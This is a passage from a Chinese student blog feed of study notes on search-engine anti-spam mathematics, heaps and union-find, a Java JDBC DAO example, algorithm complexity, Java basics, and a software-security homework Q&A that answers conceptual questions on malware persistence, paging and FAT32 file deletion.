</ul>
<p>如下图，原始的信号混入噪声，在数学上表现为他们两个做了卷积，消除噪声的过程就是解卷积的过程。</p>
<p><img src="/2020/03/07/2020-03-07-beatuy-of-mathematics/image-20200307184140323.png" alt="image-20200307184140323"></p>
<h4 id="反作弊中”道“的扩展"><a href="#反作弊中”道“的扩展" class="headerlink" title="反作弊中”道“的扩展"></a>反作弊中”道“的扩展</h4><p>一个判断<code>链接站</code>的思路：</p>
<p>将网站的出链（其指向的URL）作为一个向量，它是这个网站的固有特征。</p>
<p>而通过对两个网站的向量计算余弦距离，若两个网站的出链URL几乎相同，则其出链向量的余弦距离为几近于1。</p>
<p>另一个判断<code>链接站</code>的思路：</p>
<p>由于<code>链接站</code>普遍两两链接，所以使用<code>图论</code>来寻找这些互联网中的<code>闭环</code>，就可以找到<code>链接站</code>。</p>
<p>可以看到，这两个思路都用到了数学，赞美数学！</p>
<h4 id="搜索结果的权威性"><a href="#搜索结果的权威性" class="headerlink" title="搜索结果的权威性"></a>搜索结果的权威性</h4><p>权威性：例如医疗方面的问题，需要判断搜索结果是否完全可信，这就是权威性的判断。</p>
<p>如何判断权威性呢？</p>
<p>一个概念 “<strong>提及</strong>”（Mention）。</p>
<p>如果一个主题中的信息页中，有某个机构普遍、多次被“<strong>提及</strong>”，那就有理由判断其是权威的。</p>
<p>计算权威有两个难点：</p>
<ul>
<li>“<strong>提及</strong>”需要<strong>自然语言处理</strong>NLP（natural language processing），得知文本内容的意思。</li>
<li>权威是与领域相关的，一个机构在医学领域是权威的，但其在其他领域不一定相关。</li>
</ul>
<h4 id="权威性计算"><a href="#权威性计算" class="headerlink" title="权威性计算"></a>权威性计算</h4><ol>
<li><code>句法分析</code>，寻找涉及主题短语、对信息源的描述。</li>
<li>利用<code>互信息</code>，寻找道主题短语和信息源的相关性。</li>
<li>对主题短语进行<code>聚类</code>，这里需要用到NLP，比如”吸烟的危害“和”香烟的危害“是相同的。</li>
<li>一个网站也要分成不同的领域来判断。</li>
</ol>
<p>（句法分析、互信息、聚类后面都是数学!）</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>虽然先前都有了学习，但是看了这几章，还是不得不赞叹数学、信息论的力量。</p>
<p>从网络爬虫中的图论知识，到PageRank中的矩阵运算，TF-IDF、反作弊中余弦、闭环的巧妙运用等等。</p>
<p>都是数学的应用体现，<del>麻麻再也不担心我讨厌数学了</del>。</p>
<p>收获还是有的吧，爬虫和pagerank课上都学过了，这里权当复习了。</p>
<p>而互联网为啥叫网，我终于清晰的了解了。反作弊我还是第一次学习到，很有趣。</p>
<p>在互联网时代，学这些是有好处的，毕竟网络已经无处不在，学这些有利于“生存”。</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-03-06-algorithm-2</title>
    <url>/2020/03/06/2020-03-06-algorithm-2/</url>
    <content><![CDATA[<h2 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h2><p>定义：堆是一个完全的二叉树，每个节点都满足（任一父节点的键值都不小于子节点的键值）</p>
<p><img src="/2020/03/06/2020-03-06-algorithm-2/C:%5CUsers%5C78290%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200306143043099.png" alt="image-20200306143043099"></p>
<p>非升序排列的二叉树</p>
<p><img src="/2020/03/06/2020-03-06-algorithm-2/C:%5CUsers%5C78290%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200306143353432.png" alt="image-20200306143353432"></p>
<p>存储的方式</p>
<ul>
<li>根节点存在H[1]</li>
<li>节点H[i]左右子节点存在H[2i]、H[2i+1]</li>
<li>节点H[j]父节点为</li>
</ul>
<p><img src="/2020/03/06/2020-03-06-algorithm-2/C:%5CUsers%5C78290%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200306143720731.png" alt="image-20200306143720731"></p>
<h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a><strong>基本操作</strong></h3><ul>
<li><p>make-heap   nlog(n) 即</p>
<p>insert</p>
<p>shift-down</p>
<p><img src="/2020/03/06/2020-03-06-algorithm-2/C:%5CUsers%5C78290%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200306151812583.png" alt="image-20200306151812583"></p>
<p><img src="/2020/03/06/2020-03-06-algorithm-2/C:%5CUsers%5C78290%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200306152913995.png" alt="image-20200306152913995"></p>
</li>
<li><p>insert(H,x)   插入所需时间为O(logn)树的高度</p>
</li>
<li><p>delete(H,i)</p>
<p><img src="/2020/03/06/2020-03-06-algorithm-2/C:%5CUsers%5C78290%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200306145933371.png" alt="image-20200306145933371"></p>
</li>
<li><p>delete-max(H)</p>
</li>
</ul>
<p><img src="/2020/03/06/2020-03-06-algorithm-2/C:%5CUsers%5C78290%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200306143909302.png" alt="image-20200306143909302"></p>
<h3 id="辅助运算"><a href="#辅助运算" class="headerlink" title="辅助运算"></a>辅助运算</h3><ul>
<li>Shift-up</li>
<li>Shift-down</li>
<li></li>
</ul>
<p><img src="/2020/03/06/2020-03-06-algorithm-2/C:%5CUsers%5C78290%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200306144102573.png" alt="image-20200306144102573"></p>
<p><img src="/2020/03/06/2020-03-06-algorithm-2/C:%5CUsers%5C78290%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200306144632289.png" alt="image-20200306144632289"></p>
<p><img src="/2020/03/06/2020-03-06-algorithm-2/C:%5CUsers%5C78290%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200306145341282.png" alt="image-20200306145341282"></p>
<p><img src="/2020/03/06/2020-03-06-algorithm-2/C:%5CUsers%5C78290%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200306145535439.png" alt="image-20200306145535439"></p>
<h3 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h3><p><img src="/2020/03/06/2020-03-06-algorithm-2/C:%5CUsers%5C78290%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200306153013519.png" alt="image-20200306153013519"></p>
<ul>
<li>创建最大堆</li>
<li>把根节点与最后一个节点交换</li>
<li>再创建最大堆</li>
<li>再交换</li>
</ul>
<h2 id="不相交集-Disjoint-Sets"><a href="#不相交集-Disjoint-Sets" class="headerlink" title="不相交集(Disjoint Sets)"></a>不相交集(Disjoint Sets)</h2><h3 id><a href="#" class="headerlink" title></a></h3><ul>
<li>每个元素不相同</li>
<li>可以用树表示</li>
</ul>
<p><img src="/2020/03/06/2020-03-06-algorithm-2/C:%5CUsers%5C78290%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200306155841259.png" alt="image-20200306155841259"></p>
<p><img src="/2020/03/06/2020-03-06-algorithm-2/C:%5CUsers%5C78290%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200306160011900.png" alt="image-20200306160011900"></p>
<p><img src="/2020/03/06/2020-03-06-algorithm-2/C:%5CUsers%5C78290%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200306160421170.png" alt="image-20200306160421170"></p>
<p><img src="/2020/03/06/2020-03-06-algorithm-2/C:%5CUsers%5C78290%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200306161050838.png" alt="image-20200306161050838"></p>
<p>路径压缩师，秩不会变</p>
<p><img src="/2020/03/06/2020-03-06-algorithm-2/C:%5CUsers%5C78290%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200306162018074.png" alt="image-20200306162018074"></p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>java笔记2-spring</title>
    <url>/2020/03/03/2020-03-03-JAVA-complement-2/</url>
    <content><![CDATA[<h1 id="JAVA-EE"><a href="#JAVA-EE" class="headerlink" title="JAVA EE"></a>JAVA EE</h1><h2 id="JDBC"><a href="#JDBC" class="headerlink" title="JDBC"></a>JDBC</h2><p>上手参考：<a href="https://www.zybuluo.com/wuxin1994/note/1430332" target="_blank" rel="noopener">https://www.zybuluo.com/wuxin1994/note/1430332</a></p>
<p> <strong>DAO: Data Access Object 数据访问对象</strong></p>
<h3 id="作用："><a href="#作用：" class="headerlink" title="作用："></a>作用：</h3><p>(1).隔离业务逻辑代码和数据访问代码,位于业务逻辑和持久化数据之间，实现对持久化数据的访问。<br>(2).隔离不同数据库的实现。</p>
<h3 id="组成部分："><a href="#组成部分：" class="headerlink" title="组成部分："></a>组成部分：</h3><p>(1).DAO接口<br>(2).DAO实现类<br>(3).实体类<br>(4).数据库连接和关闭工具类</p>
<h3 id="直接上代码"><a href="#直接上代码" class="headerlink" title="直接上代码"></a>直接上代码</h3><p>(1).DAO接口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package jdbc;public interface DAO &#123;    void findeAll();&#125;</span><br></pre></td></tr></table></figure>

<p>(2).DAO实现类(实体类略去)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package jdbc;</span><br><span class="line">import java.sql.Connection;</span><br><span class="line">import java.sql.ResultSet;</span><br><span class="line">import java.sql.Statement;</span><br><span class="line">&#x2F;**</span><br><span class="line"> * @Author: wufan</span><br><span class="line"> *&#x2F;</span><br><span class="line">public class UerDao implements DAO &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void findeAll() &#123;</span><br><span class="line">        Connection conn &#x3D; null;</span><br><span class="line">        Statement st &#x3D; null;</span><br><span class="line">        ResultSet rs &#x3D; null;</span><br><span class="line">        try &#123;</span><br><span class="line">            &#x2F;&#x2F;1. 获取连接对象</span><br><span class="line">            conn &#x3D; JDBCUtil.getConnection();</span><br><span class="line">            &#x2F;&#x2F;2. 创建statement对象</span><br><span class="line">            st &#x3D; conn.createStatement();</span><br><span class="line">            String sql &#x3D; &quot;select * from user&quot;;</span><br><span class="line">            rs &#x3D; st.executeQuery(sql);</span><br><span class="line">            while(rs.next())&#123;</span><br><span class="line">                String phone &#x3D; rs.getString(&quot;phone&quot;);</span><br><span class="line">                int id &#x3D; rs.getInt(&quot;uid&quot;);</span><br><span class="line">                System.out.print(id+&quot;\t&quot;+phone);</span><br><span class="line">                System.out.println(&quot;&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;finally &#123;</span><br><span class="line">            JDBCUtil.release(conn, st, rs);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        UerDao ud &#x3D; new UerDao();</span><br><span class="line">        ud.findeAll();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>(4).数据库连接和关闭工具类</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package jdbc;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.sql.*;</span><br><span class="line">import java.util.Properties;</span><br><span class="line">&#x2F;**</span><br><span class="line"> * @Author: wufan</span><br><span class="line"> *&#x2F;</span><br><span class="line">public class JDBCUtil &#123;</span><br><span class="line">    private static String driverClass;</span><br><span class="line">    private static String url;</span><br><span class="line">    private static String username;</span><br><span class="line">    private static String password;</span><br><span class="line">    static&#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Properties properties &#x3D; new Properties();</span><br><span class="line">            &#x2F;&#x2F;InputStream is &#x3D; JDBCUtil.class.getClassLoader().getResourceAsStream(&quot;JDBC.properties&quot;);</span><br><span class="line">            InputStream is &#x3D; new FileInputStream(&quot;P:\\Java\\Database\\src\\JDBC.properties&quot;); &#x2F;&#x2F;对应文件位于工程根目录</span><br><span class="line">            properties.load(is);</span><br><span class="line">            driverClass &#x3D; properties.getProperty(&quot;driverClass&quot;);</span><br><span class="line">            url &#x3D; properties.getProperty(&quot;url&quot;);</span><br><span class="line">            username &#x3D; properties.getProperty(&quot;username&quot;);</span><br><span class="line">            password &#x3D; properties.getProperty(&quot;password&quot;);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;获取连接</span><br><span class="line">    public static Connection getConnection() &#123;</span><br><span class="line">        Connection conn &#x3D; null;</span><br><span class="line">        try &#123;</span><br><span class="line">            Class.forName(driverClass);</span><br><span class="line">            conn &#x3D; DriverManager.getConnection(url, username, password);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        return conn;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;释放资源</span><br><span class="line">    public static void release(Connection conn, Statement pstmt, ResultSet rs) &#123;</span><br><span class="line">        if (rs !&#x3D; null) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                rs.close();</span><br><span class="line">            &#125; catch (SQLException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if (pstmt !&#x3D; null) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                pstmt.close();</span><br><span class="line">            &#125; catch (SQLException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if (conn !&#x3D; null) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                conn.close();</span><br><span class="line">            &#125; catch (SQLException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







<h1 id="spring上手"><a href="#spring上手" class="headerlink" title="spring上手"></a>spring上手</h1><h2 id="挖坑中…-新的坑，新的挑战"><a href="#挖坑中…-新的坑，新的挑战" class="headerlink" title="# 挖坑中….新的坑，新的挑战"></a># 挖坑中….新的坑，新的挑战</h2>]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>spring</tag>
      </tags>
  </entry>
  <entry>
    <title>软件安全第一次作业</title>
    <url>/2020/03/02/2020-03-02-Software-security-notebook-1/</url>
    <content><![CDATA[<h1 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h1><h3 id="a"><a href="#a" class="headerlink" title="a)"></a>a)</h3><p>Q：恶意软件如何在系统重启、系统重装、以及硬盘更换之后继续获得控制权？</p>
<p>A：</p>
<ul>
<li>重启：BIOS、MBR、DBR、NTLDR、自启动项（文件病毒）。</li>
<li>重装：BIOS、MBR。</li>
<li>硬盘更换：BIOS引导。</li>
</ul>
<h3 id="b"><a href="#b" class="headerlink" title="b)"></a>b)</h3><p>Q：给出在系统重启时恶意软件可以获得控制权的至少5种启动方式（并实践）。哪些方式不需要系统管理员权限？</p>
<p>A：Bios、MBR、DBR、NTLDR、自启动项。</p>
<h3 id="c"><a href="#c" class="headerlink" title="c)"></a>c)</h3><p>Q：每个进程可用4GB内存空间，但有的电脑内存才2G！系统如何做到的？</p>
<p>A：虚拟地址转换物理地址</p>
<h3 id="d"><a href="#d" class="headerlink" title="d)"></a>d)</h3><p>Q：两个进程的可执行程序映像加载地址都是00400000H，但同一地址对应的数据却不一样，为什么？</p>
<p>A：因为是虚拟地址转换成物c理地址，他们的00400000H转换成的物理地址都</p>
<p>不一样（cr3、页目录不一样）</p>
<h3 id="e"><a href="#e" class="headerlink" title="e)"></a>e)</h3><p>Q：PAE模式下，虚拟地址依然只有32位地址，为何可以寻址64G范围内的物理内存?</p>
<ul>
<li>i.内存管理：物理地址扩展（PAE）分页机制<a href="https://blog.csdn.net/trochiluses/article/details/12853027" target="_blank" rel="noopener">https://blog.csdn.net/trochiluses/article/details/12853027</a></li>
<li>ii.PAE分页模式详解：<a href="https://www.cnblogs.com/ck1020/p/6078214.html" target="_blank" rel="noopener">https://www.cnblogs.com/ck1020/p/6078214.html</a> </li>
</ul>
<p>A：分页的方式不同，PAE下，使用32位（2+9+9+12+4个内存目录项）。</p>
<h3 id="f"><a href="#f" class="headerlink" title="f)"></a>f)</h3><p>Q：如果硬盘分区表被完全破坏，如何重构分区表？</p>
<p>A：根据FAT表，以及数据的分布。</p>
<h3 id="g"><a href="#g" class="headerlink" title="g)"></a>g)</h3><p>Q：FAT32系统下文件被删除时，系统具体做了哪些修改？</p>
<p>A：（1）回收箱，文件名首字节变为E5<br>        （2）shift+deltete，文件首字节E5，FAT簇号高位归零，FAT簇链归零</p>
<h3 id="h"><a href="#h" class="headerlink" title="h)"></a>h)</h3><p>Q：数据擦写（安全删除）的原理什么？</p>
<p>A：由于磁盘可以重复使用，前面的数据被后面的数据覆盖后，前面的数据被还原的可能性就大大降低了，随着被</p>
<p>覆盖次数的增多，能够被还原的可能性就趋于 0，但相应的时间支出也就越多。密级要求的高低对应着不同的标</p>
<p>准，低密级要求的就是一次性将磁盘全部覆盖；高密级要求则须进行多次多规则覆盖。覆盖是指使用预先定义的格</p>
<p>式——无意义、无规律的信息来覆盖硬盘上原先存储的数据。</p>
<h3 id="i"><a href="#i" class="headerlink" title="i)"></a>i)</h3><p>Q：在使用数据恢复软件时，为什么标准格式文件（如doc、jpg等）比非格式文件更容易被恢复？</p>
<p>A：应该是，标准文件每部分都有固定的格式，可以方便恢复簇</p>
<h3 id="j"><a href="#j" class="headerlink" title="j)"></a>j)</h3><p>Q：在进行数据恢复时，为何有时候恢复出来的大文件只有前半部分是正确的？</p>
<p>A：因为簇链不连续。</p>
<h3 id="k"><a href="#k" class="headerlink" title="k)"></a>k)</h3><p>Q：恶意代码一定要在文件系统中以文件的方式出现么？它还可以隐藏在哪些区域以躲避被发现和查杀？</p>
<p>A：不一定以文件形式存在。可以隐藏在MBR、bios这些之中。</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-02-28-algorithm-class</title>
    <url>/2020/02/28/2020-02-28-algorithm-class/</url>
    <content><![CDATA[<p><img src="/2020/02/28/2020-02-28-algorithm-class/image-20200228174457509.png" alt></p>
<a id="more"></a>

<h1 id="概论"><a href="#概论" class="headerlink" title="概论"></a>概论</h1><h3 id="算法是啥？"><a href="#算法是啥？" class="headerlink" title="算法是啥？"></a>算法是啥？</h3><ol>
<li><p>为解决某一问题定义的计算过程。</p>
</li>
<li><p>是通过一个有限的指令序列集合对特定问题进行求解的一种计算执行描述。</p>
</li>
</ol>
<h3 id="算法的性质"><a href="#算法的性质" class="headerlink" title="算法的性质"></a>算法的性质</h3><ul>
<li><p>可行性：可通过基本运算有限次执行来实现。</p>
</li>
<li><p>有穷性：算法的运行步数是有穷（即能运行完出结果的算法，运行不完没有结果有你有何用）</p>
</li>
<li><p>确定性：无二义性。</p>
</li>
<li><p>有输入输出：存在数据处理</p>
</li>
</ul>
<h3 id="程序与算法的区别"><a href="#程序与算法的区别" class="headerlink" title="程序与算法的区别"></a>程序与算法的区别</h3><p>算法的概念与程序十分相似,但实际上有很大不同。程序并不都满足算法所要求的上述特征, 例如有限性特征。算法代表了对特定问题的求 解,而程序则是算法在计算机上的实现。</p>
<h2 id="算法复杂度"><a href="#算法复杂度" class="headerlink" title="算法复杂度"></a>算法复杂度</h2><ul>
<li>O；f/g=/=∞</li>
<li></li>
<li></li>
</ul>
<p>举例</p>
<p>二分搜索复杂度为：O(logn)</p>
<p>合并两已排序表：O(n)  n/2-&gt;n-1</p>
<p>选择排序：O(n^2)        n(n-1)/2</p>
<p>插入排序：O(n^2)       最好n-1次，最坏n(n-1)/2</p>
<p>合并排序算法：O(nlogn)</p>
<h3 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h3><p><img src="/2020/02/28/2020-02-28-algorithm-class/image-20200306125945288.png" alt="image-20200306125945288"></p>
<h4 id="（1）O符号-上界"><a href="#（1）O符号-上界" class="headerlink" title="（1）O符号-上界"></a>（1）O符号-上界</h4><p>G越小越好</p>
<p>假设： f (n) 和g(n) 是从<strong>自然数集到非负实数集</strong>里的两个函数</p>
<p>定义1 (O)：如果存在正的常数C和自然数n0，使得当n≥n0时， 有f(n)≤C·g(n)，则称函数f (n) 在n 充分大</p>
<p>时有上有界，且g(n) 是它的一个上界，记做f (n) = O(g(n))</p>
<p><img src="/2020/02/28/2020-02-28-algorithm-class/image-20200306130222135.png" alt="image-20200306130222135"></p>
<h4 id="（2）Ω符号-下界"><a href="#（2）Ω符号-下界" class="headerlink" title="（2）Ω符号-下界"></a>（2）Ω符号-下界</h4><p>G越小大越好</p>
<p>定义2(Ω)： 如果存在正的常数C 和自然数n0 ， 使得当n ≥ n0时， 有f(n)≥C·g(n)，则称函数f (n) 在n 充分大时有下有界，且g(n) 是它的一个下界，记做f (n) = Ω(g(n))</p>
<p><img src="/2020/02/28/2020-02-28-algorithm-class/image-20200306130400180.png" alt="image-20200306130400180"></p>
<h4 id="（3）Θ符号-渐进紧确界"><a href="#（3）Θ符号-渐进紧确界" class="headerlink" title="（3）Θ符号-渐进紧确界"></a>（3）Θ符号-渐进紧确界</h4><p>最棒的表述，比O，Ω好</p>
<p><img src="/2020/02/28/2020-02-28-algorithm-class/image-20200306130554033.png" alt="image-20200306130554033"></p>
<p><img src="/2020/02/28/2020-02-28-algorithm-class/image-20200306130607267.png" alt="image-20200306130607267"></p>
<h4 id="（4）o符号"><a href="#（4）o符号" class="headerlink" title="（4）o符号"></a>（4）o符号</h4><p>与大O符号类似，但是大O符号对于某个大于零的常量c成立，而小o符号则对所有常量c&gt;0成立</p>
<p><img src="/2020/02/28/2020-02-28-algorithm-class/image-20200306130832478.png" alt="image-20200306130832478"></p>
<h4 id="（5）性质"><a href="#（5）性质" class="headerlink" title="（5）性质"></a>（5）性质</h4><p>传递性：f&lt;g&lt;h；自反性：f=f；对称性：Θ相同；转置对称：f&lt;g==g&gt;f</p>
<p><img src="/2020/02/28/2020-02-28-algorithm-class/image-20200306130920867.png" alt="image-20200306130920867"></p>
<h4 id="小问题"><a href="#小问题" class="headerlink" title="小问题"></a>小问题</h4><p>就是说不能说至少</p>
<p><img src="/2020/02/28/2020-02-28-algorithm-class/image-20200306131333799.png" alt="image-20200306131333799"></p>
<h2 id="估计算法时间复杂度"><a href="#估计算法时间复杂度" class="headerlink" title="估计算法时间复杂度"></a>估计算法时间复杂度</h2><ul>
<li>估计迭代次数</li>
<li>频度分析</li>
<li>使用递归方程</li>
</ul>
<h2 id="数学工具"><a href="#数学工具" class="headerlink" title="数学工具"></a>数学工具</h2><ul>
<li>数学基础</li>
<li>证明方法<ul>
<li>直接证明、间接证明</li>
<li>反证法</li>
<li>数学归纳法</li>
</ul>
</li>
<li>递归方程求解（*）</li>
<li>Master定理（*）</li>
<li>基本数据结构</li>
</ul>
<h3 id="（1）证明方法"><a href="#（1）证明方法" class="headerlink" title="（1）证明方法"></a>（1）证明方法</h3><h4 id="反证法"><a href="#反证法" class="headerlink" title="反证法"></a>反证法</h4><p><img src="/2020/02/28/2020-02-28-algorithm-class/image-20200306131942409.png" alt="image-20200306131942409"></p>
<h4 id="数学归纳法"><a href="#数学归纳法" class="headerlink" title="数学归纳法"></a>数学归纳法</h4><p><img src="/2020/02/28/2020-02-28-algorithm-class/image-20200306131921482.png" alt="image-20200306131921482"></p>
<h3 id="（2）递归方程求解"><a href="#（2）递归方程求解" class="headerlink" title="（2）递归方程求解"></a>（2）递归方程求解</h3><h4 id="常系数递归方程求解"><a href="#常系数递归方程求解" class="headerlink" title="常系数递归方程求解"></a>常系数递归方程求解</h4><p>T有n个就是n-1阶</p>
<p>T(n)=T(n-1)+T(n-2)有2阶</p>
<p><img src="/2020/02/28/2020-02-28-algorithm-class/image-20200306132041333.png" alt="image-20200306132041333"></p>
<p><img src="/2020/02/28/2020-02-28-algorithm-class/image-20200306132117637.png" alt="image-20200306132117637"></p>
<h4 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h4><ol>
<li>先弄出二阶方程、算出两个根</li>
<li>选择T（n）的<strong>表示法</strong></li>
<li>根据题目给的两个T（n）的值计算C1、C2</li>
<li>最后代入（2）算出T（n）的<strong>表达式</strong>\即时间复杂度</li>
</ol>
<p><img src="/2020/02/28/2020-02-28-algorithm-class/image-20200306132456701.png" alt="image-20200306132456701"></p>
<h3 id="（3）Master定理"><a href="#（3）Master定理" class="headerlink" title="（3）Master定理"></a>（3）Master定理</h3><p><img src="/2020/02/28/2020-02-28-algorithm-class/image-20200306132705476.png" alt="image-20200306132705476"></p>
<h4 id="证明："><a href="#证明：" class="headerlink" title="证明："></a>证明：</h4><h4 id="例子：-1"><a href="#例子：-1" class="headerlink" title="例子："></a>例子：</h4><p><img src="/2020/02/28/2020-02-28-algorithm-class/image-20200306132740874.png" alt="image-20200306132740874"></p>
<p><img src="/2020/02/28/2020-02-28-algorithm-class/image-20200306132820314.png" alt="image-20200306132820314"></p>
<p>3/4*Log(n/4)&lt;c *log(n)（c&lt;1，随便取）</p>
<h4 id="练习："><a href="#练习：" class="headerlink" title="练习："></a>练习：</h4><p><img src="/2020/02/28/2020-02-28-algorithm-class/image-20200306134213863.png" alt="image-20200306134213863"></p>
<p>S(n)=O(n^(1/2-E))    E&gt;0  E取0到1/2</p>
<p><img src="/2020/02/28/2020-02-28-algorithm-class/image-20200306134353096.png" alt="image-20200306134353096"></p>
<p>S(n)=欧米伽(n^(1/2+E))    E&gt;0   E取0到1/2</p>
<p>2*n/4&lt; c *n   c&lt;1   取1/2&lt;c&lt;1</p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>-算法</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA 笔记</title>
    <url>/2020/02/26/2020-02-26-JAVA-complement-1/</url>
    <content><![CDATA[<h1 id="暂时咕咕"><a href="#暂时咕咕" class="headerlink" title="暂时咕咕~"></a>暂时咕咕~</h1><h1 id="这系列文章会讲什么？"><a href="#这系列文章会讲什么？" class="headerlink" title="这系列文章会讲什么？"></a>这系列文章会讲什么？</h1><p>首先，我打算将java作为我的主语言去学。</p>
<p>之前确实是看过书<code>java核心技术</code>，但是也没细细阅览，有些不用基本都忘了。</p>
<p>所以吧，我将渐渐的补全java所涉及的知识，<del>绝不咕咕</del></p>
<p>首先声明，这篇文章绝大部分只是我 <code>个人</code> 的java知识点收集笔记。</p>
<p>并不是从入门到大佬的内容，水平有限，难免有错。</p>
<p>参考：<a href="https://dunwu.github.io/java-tutorial/#javacore" target="_blank" rel="noopener">https://dunwu.github.io/java-tutorial/#javacore</a></p>
<h1 id="java、jvm、jdk、jre、java-EE是什么？"><a href="#java、jvm、jdk、jre、java-EE是什么？" class="headerlink" title="java、jvm、jdk、jre、java EE是什么？"></a>java、jvm、jdk、jre、java EE是什么？</h1><p>这些名词也许会让初学的你感到十分疑惑，希望我能让你明白。</p>
<p><strong>Java</strong> 是由Sun Microsystems公司于1995年5月推出的高级程序设计语言。</p>
<p>Java可运行于多个平台，如Windows, Mac OS，及其他多种UNIX版本的系统。</p>
<p><strong>jvm</strong>  即Java Virtual Machine（java虚拟机），由于jvm的特性，java可以一处编译处处运行。（但是win下写的</p>
<p>java并不能在android上运行，这是因为android的jvm与java的jvm不一样。）</p>
<p><strong>jdk</strong> 即Java Development Kit（java软件开发工具包），用于编译Java程序（指java源码.java文件），jdk中也包含</p>
<p>了jre用于运行Java程序（指class或jar或其它归档文件）。</p>
<p><strong>jre</strong>  即Java Runtime Environment（java运行环境），JRE的内部有一个Java虚拟机（Java Virtual Machine，</p>
<p>JVM）以及一些标准的类别函数库（Class Library）。</p>
<p><strong>jdk的版本:SE、EE、ME</strong> </p>
<p>SE(JavaSE)，standard edition，标准版，是我们通常用的一个版本，从JDK 5.0开始，改名为Java SE。</p>
<p>EE(JavaEE)，enterprise edition，企业版，使用这种JDK开发J2EE应用程序，从JDK 5.0开始，改名为Java EE。</p>
<p>ME(J2ME)，micro edition，主要用于移动设备、嵌入式设备上的java应用程序，从JDK 5.0开始，改名为Java ME。</p>
<h1 id="java知识的体系结构"><a href="#java知识的体系结构" class="headerlink" title="java知识的体系结构"></a>java知识的体系结构</h1><p>这里放一个比较好的汇总贴（墙裂建议阅读）</p>
<p><a href="https://dunwu.github.io/java-tutorial/#javacore" target="_blank" rel="noopener">https://dunwu.github.io/java-tutorial/#javacore</a></p>
<h1 id="java-serlvet-jsp-tomcat"><a href="#java-serlvet-jsp-tomcat" class="headerlink" title="java serlvet\jsp\tomcat"></a>java serlvet\jsp\tomcat</h1><h3 id="什么是-Servlet"><a href="#什么是-Servlet" class="headerlink" title="什么是 Servlet"></a>什么是 Servlet</h3><p>Servlet（Server Applet），即小服务程序或服务连接器。Servlet 是 Java 编写的服务器端程序，具有独立于平台和协议的特性，主要功能在于交互式地浏览和生成数据，生成动态 Web 内容。</p>
<ul>
<li>狭义的 Servlet 是指 Java 实现的一个接口。</li>
<li>广义的 Servlet 是指任何实现了这个 Servlet 接口的类。</li>
</ul>
<p>Servlet 运行于支持 Java 的应用服务器中。从原理上讲，Servlet 可以响应任何类型的请求，但绝大多数情况下 Servlet 只用来扩展基于 HTTP 协议的 Web 服务器。</p>
